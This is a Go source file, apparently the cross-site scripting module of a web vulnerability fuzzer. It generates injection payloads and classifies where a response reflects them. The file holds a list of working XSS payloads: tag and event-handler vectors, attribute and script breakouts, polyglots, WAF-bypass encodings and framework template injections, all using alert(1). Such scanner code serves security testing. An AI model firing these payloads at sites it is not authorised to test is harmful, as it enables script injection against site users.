package vulns

import (
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

type XSSModule struct{}

func (m *XSSModule) Name() string        { return "xss" }
func (m *XSSModule) Description() string { return "Cross-Site Scripting (reflected, DOM, polyglot)" }

func (m *XSSModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload
	raw := xssPayloads()
	for _, point := range points {
		for _, p := range raw {
			payloads = append(payloads, mutator.Payload{
				Value:   p.value,
				Point:   point,
				Module:  "xss",
				Variant: p.variant,
			})
			if mode == "smart" || mode == "mutate" {
				for _, encoded := range mutator.EncodeVariants(p.value) {
					if encoded != p.value {
						payloads = append(payloads, mutator.Payload{Value: encoded, Point: point, Module: "xss", Variant: p.variant + "+encoded"})
					}
				}
			}
		}
	}
	return payloads
}

func (m *XSSModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	// Check Content-Type (XSS only executes in HTML responses)
	ct := ""
	if vals, ok := respHeaders["Content-Type"]; ok && len(vals) > 0 {
		ct = strings.ToLower(vals[0])
	}
	isHTML := strings.Contains(ct, "text/html") || strings.Contains(ct, "xhtml") || ct == ""

	if !strings.Contains(respBody, payload.Value) || strings.Contains(baseBody, payload.Value) {
		return nil
	}

	// Reflected but not in HTML - low risk
	if !isHTML {
		return &Finding{Module: "xss", Severity: "info", Confidence: "low",
			Title: "XSS - Reflected in non-HTML response (not executable)",
			Payload: payload.Value, Point: payload.Point,
			Evidence: "Content-Type: " + ct, OWASP: "A03:2021 Injection", CWE: "CWE-79"}
	}

	// Check if HTML-encoded (safe)
	encoded := strings.ReplaceAll(strings.ReplaceAll(payload.Value, "<", "&lt;"), ">", "&gt;")
	if strings.Contains(respBody, encoded) {
		return nil
	}

	// Determine reflection context
	idx := strings.Index(respBody, payload.Value)
	ctx := xssContext(respBody, idx)

	switch ctx {
	case "html_body":
		if strings.Contains(payload.Value, "<") && strings.Contains(payload.Value, ">") {
			return &Finding{Module: "xss", Severity: "high", Confidence: "confirmed",
				Title: "XSS - Reflected in HTML body (executable)",
				Description: "Unencoded HTML tags in body context will execute in browser",
				Payload: payload.Value, Point: payload.Point,
				Evidence: "Unencoded HTML in body context, Content-Type: text/html",
				OWASP: "A03:2021 Injection", CWE: "CWE-79"}
		}
		return &Finding{Module: "xss", Severity: "medium", Confidence: "medium",
			Title: "XSS - Reflected in HTML body (no tags, verify manually)",
			Payload: payload.Value, Point: payload.Point,
			Evidence: "Reflected in HTML body but payload has no tags",
			OWASP: "A03:2021 Injection", CWE: "CWE-79"}
	case "attribute":
		return &Finding{Module: "xss", Severity: "high", Confidence: "high",
			Title: "XSS - Reflected in HTML attribute (breakout possible)",
			Payload: payload.Value, Point: payload.Point,
			Evidence: "Reflected inside attribute without proper escaping",
			OWASP: "A03:2021 Injection", CWE: "CWE-79"}
	case "script":
		return &Finding{Module: "xss", Severity: "high", Confidence: "high",
			Title: "XSS - Reflected in script block (breakout possible)",
			Payload: payload.Value, Point: payload.Point,
			Evidence: "Reflected inside <script> block",
			OWASP: "A03:2021 Injection", CWE: "CWE-79"}
	case "safe":
		return nil
	}

	return &Finding{Module: "xss", Severity: "medium", Confidence: "low",
		Title: "XSS - Reflected (context unclear, verify manually)",
		Payload: payload.Value, Point: payload.Point,
		Evidence: "Payload reflected, manual verification needed",
		OWASP: "A03:2021 Injection", CWE: "CWE-79"}
}

func xssContext(body string, idx int) string {
	if idx < 0 {
		return "unknown"
	}
	before := body[:idx]
	if len(before) > 500 {
		before = before[len(before)-500:]
	}
	lower := strings.ToLower(before)

	// Inside safe elements
	for _, tag := range []string{"<textarea", "<title", "<style", "<!--"} {
		close := "</" + tag[1:]
		if tag == "<!--" {
			close = "-->"
		}
		if strings.LastIndex(lower, tag) > strings.LastIndex(lower, close) {
			return "safe"
		}
	}
	// Inside <script>
	if strings.LastIndex(lower, "<script") > strings.LastIndex(lower, "</script") {
		return "script"
	}
	// Inside attribute (unmatched quote after =)
	for _, q := range []string{"=\"", "='"} {
		last := strings.LastIndex(before, q)
		if last >= 0 {
			quote := string(q[1])
			if !strings.Contains(before[last+2:], quote) {
				return "attribute"
			}
		}
	}
	return "html_body"
}

type xssPayload struct {
	value   string
	variant string
}

func xssPayloads() []xssPayload {
	return []xssPayload{
		// Basic
		{`<script>alert(1)</script>`, "basic"},
		{`<img src=x onerror=alert(1)>`, "event-handler"},
		{`<svg onload=alert(1)>`, "svg"},
		{`<body onload=alert(1)>`, "body"},
		{`<iframe src="javascript:alert(1)">`, "iframe"},
		{`<input onfocus=alert(1) autofocus>`, "autofocus"},
		{`<details open ontoggle=alert(1)>`, "details"},
		{`<marquee onstart=alert(1)>`, "marquee"},
		{`<video><source onerror=alert(1)>`, "video"},
		{`<audio src=x onerror=alert(1)>`, "audio"},

		// Attribute escape
		{`" onmouseover="alert(1)`, "attr-escape"},
		{`' onmouseover='alert(1)`, "attr-escape-sq"},
		{`"><script>alert(1)</script>`, "attr-break"},
		{`'><script>alert(1)</script>`, "attr-break-sq"},
		{`" onfocus="alert(1)" autofocus="`, "attr-inject"},

		// JavaScript context
		{`';alert(1)//`, "js-context"},
		{`";alert(1)//`, "js-context-dq"},
		{`</script><script>alert(1)</script>`, "script-break"},
		{`\";alert(1)//`, "js-escape"},
		{`'-alert(1)-'`, "js-expr"},

		// Template literals
		{"${alert(1)}", "template-literal"},
		{"`${alert(1)}`", "template-literal-bt"},

		// DOM-based vectors
		{`javascript:alert(1)`, "dom-href"},
		{`data:text/html,<script>alert(1)</script>`, "data-uri"},
		{`#<script>alert(1)</script>`, "fragment"},

		// Polyglots
		{`jaVasCript:/*-/*` + "`" + `/*\` + "`" + `/*'/*"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`, "polyglot"},
		{`'-alert(1)-'`, "polyglot-short"},
		{`'";!--"<XSS>=&{()}`, "probe"},

		// WAF bypass
		{`<scr<script>ipt>alert(1)</scr</script>ipt>`, "waf-nested"},
		{`<ScRiPt>alert(1)</ScRiPt>`, "waf-case"},
		{`<script/x>alert(1)</script>`, "waf-slash"},
		{`<script%20>alert(1)</script>`, "waf-space"},
		{`<img src=x onerror=alert&#40;1&#41;>`, "waf-entities"},
		{`<svg/onload=alert(1)>`, "waf-nospace"},
		{`<img src=x onerror=\u0061lert(1)>`, "waf-unicode"},
		{`<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`, "waf-decimal"},
		{`\x3cscript\x3ealert(1)\x3c/script\x3e`, "waf-hex"},
		{`<math><mi><!--</mi><script>alert(1)</script>`, "mutation-xss"},

		// Framework-specific
		{`{{constructor.constructor('alert(1)')()}}`, "angular"},
		{`{{$on.constructor('alert(1)')()}}`, "angular2"},
		{`<div v-html="'<img src=x onerror=alert(1)>'"></div>`, "vue"},
		{`{alert(1)}`, "svelte"},
	}
}
